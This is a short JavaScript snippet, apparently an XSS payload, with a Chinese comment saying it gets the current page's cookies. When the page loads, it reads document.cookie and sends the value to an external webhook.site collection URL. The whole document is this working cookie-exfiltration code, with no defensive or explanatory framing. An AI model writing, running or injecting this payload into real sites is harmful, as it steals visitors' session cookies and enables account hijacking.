document.addEventListener('DOMContentLoaded', function() {
  var cookies = document.cookie; // 获取当前页面的cookies
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://webhook.site/a1a42fea-588b-4dcc-9f00-f52c22c8c97d?cookies=' + encodeURIComponent(cookies), true);
  xhr.send();
});
